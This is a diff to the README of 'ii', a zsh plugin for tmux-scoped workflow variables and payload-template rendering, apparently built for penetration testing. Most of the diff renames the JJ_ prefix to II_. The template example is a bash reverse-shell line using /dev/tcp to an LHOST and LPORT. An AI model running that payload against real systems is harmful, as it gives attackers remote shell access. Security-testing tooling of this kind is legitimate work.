@@ -2,7 +2,7 @@
 
 `ii` is a zsh plugin for tmux-scoped workflow variables and payload rendering.
 
-It stores `JJ_` variables in the current tmux session, lets each pane load
+It stores `II_` variables in the current tmux session, lets each pane load
 those variables when needed, and renders payload templates from fresh tmux
 session values.
 
@@ -112,12 +112,12 @@ Add this line to `~/.zshrc`:
 source "$HOME/.config/zsh/plugin/ii/ii.plugin.zsh"
 ```
 
-No extra `export JJ_PAYLOAD_DIR=...` line is needed for the bundled payloads.
+No extra `export II_PAYLOAD_DIR=...` line is needed for the bundled payloads.
 The plugin sets this automatically:
 
 ```text
-JJ_PLUGIN_DIR=$HOME/.config/zsh/plugin/ii
-JJ_PAYLOAD_DIR=${JJ_PLUGIN_DIR}/payloads
+II_PLUGIN_DIR=$HOME/.config/zsh/plugin/ii
+II_PAYLOAD_DIR=${II_PLUGIN_DIR}/payloads
 ```
 
 Reload zsh:
@@ -130,22 +130,22 @@ Confirm it loaded:
 
 ```zsh
 type ii
-echo $JJ_PAYLOAD_DIR
+echo $II_PAYLOAD_DIR
 ```
 
 ## Payload Setup
 
-By default, the plugin points `JJ_PAYLOAD_DIR` to the bundled payload directory:
+By default, the plugin points `II_PAYLOAD_DIR` to the bundled payload directory:
 
 ```text
-${JJ_PLUGIN_DIR}/payloads
+${II_PLUGIN_DIR}/payloads
 ```
 
-You do not need to export `JJ_PAYLOAD_DIR` for the bundled payloads. Override it
+You do not need to export `II_PAYLOAD_DIR` for the bundled payloads. Override it
 only if you keep payloads somewhere else:
 
 ```zsh
-export JJ_PAYLOAD_DIR="$HOME/.config/ii/payloads"
+export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
 ```
 
 ## Clipboard Setup
@@ -155,7 +155,7 @@ available so `ii p` and `ii i` can copy to the local terminal clipboard without
 X server or Wayland clipboard tools. To force OSC52 explicitly:
 
 ```zsh
-export JJ_CLIP_BACKEND=osc52
+export II_CLIP_BACKEND=osc52
 ```
 
 Inside tmux, `ii` first tries tmux-native clipboard copy through
@@ -164,23 +164,33 @@ depends on your terminal and tmux clipboard/passthrough settings. If it does not
 copy out, keep using the tmux buffer backend:
 
 ```zsh
-export JJ_CLIP_CMD='tmux load-buffer -'
+export II_CLIP_CMD='tmux load-buffer -'
 ```
+
+For VMware Kali sessions where tmux copy-mode works through `xclip` but OSC52
+does not reach the host clipboard, use the tmux-copy-mode style X clipboard
+backend:
+
+```zsh
+export II_CLIP_BACKEND=xclip-both
+```
+
+See `doc/clipboard.md` for backend behavior and troubleshooting notes.
 
 ## Commands
 
 | Command | Short form | Purpose |
 | --- | --- | --- |
-| `ii set NAME VALUE` | `ii s NAME VALUE` | Set internal `JJ_NAME` in tmux and export `NAME` in this shell |
+| `ii set NAME VALUE` | `ii s NAME VALUE` | Set internal `II_NAME` in tmux and export `NAME` in this shell |
 | `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect LHOST from an interface, defaulting to `tun0` |
 | `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
 | `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
-| `ii load` | `ii l` | Load tmux variables into this shell without the internal `JJ_` prefix |
+| `ii load` | `ii l` | Load tmux variables into this shell without the internal `II_` prefix |
 | `ii interactive` | `ii i` | Select variable names with fzf, preview values, and copy selected values |
 | `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
 | `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, copy, and print a payload |
-| `ii unset NAME [...]` | | Remove `JJ_` variables from tmux and this shell |
-| `ii unset -a` | | Prompt, then remove all `JJ_` variables from the current tmux session |
+| `ii unset NAME [...]` | | Remove `II_` variables from tmux and this shell |
+| `ii unset -a` | | Prompt, then remove all `II_` variables from the current tmux session |
 | `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |
 
 ## Basic Workflow
@@ -201,8 +211,8 @@ ii ls user
 ii p linux
 ```
 
-`JJ_` is only an internal tmux namespace. User input is normalized to uppercase,
-so `user2` and `USER2` refer to the same tmux variable, `JJ_USER2`. User-facing
+`II_` is only an internal tmux namespace. User input is normalized to uppercase,
+so `user2` and `USER2` refer to the same tmux variable, `II_USER2`. User-facing
 commands and shell exports use names without that prefix, such as `$LHOST` and
 `$DOMAIN`. `ii set` and `ii load` export both uppercase and lowercase shell
 names, such as `$LHOST` and `$lhost`. Default names that have not been assigned
@@ -264,7 +274,7 @@ ii ls l
 
 ## Payload Library
 
-Payload files are plain text templates under `JJ_PAYLOAD_DIR`.
+Payload files are plain text templates under `II_PAYLOAD_DIR`.
 
 Example:
 
@@ -289,15 +299,15 @@ payloads/
     basic-alert
 ```
 
-Use `${JJ_NAME}` placeholders:
+Use `${II_NAME}` placeholders:
 
 ```text
-/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
+/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
 ```
 
-Files under `payloads/script/` are for custom scripts. They may use `${JJ_NAME}`
+Files under `payloads/script/` are for custom scripts. They may use `${II_NAME}`
 placeholders, or they may use literal shell variables such as `$rhost`; when no
-renderable `${JJ_*}` placeholder is present, `ii p` copies the script text as-is.
+renderable `${II_*}` placeholder is present, `ii p` copies the script text as-is.
 The payload selector shows a one-line rendered preview in the list. The selected
 payload preview reserves separate description and keys blocks around the body,
 even when a payload has no description. A first-line `# description: ...`
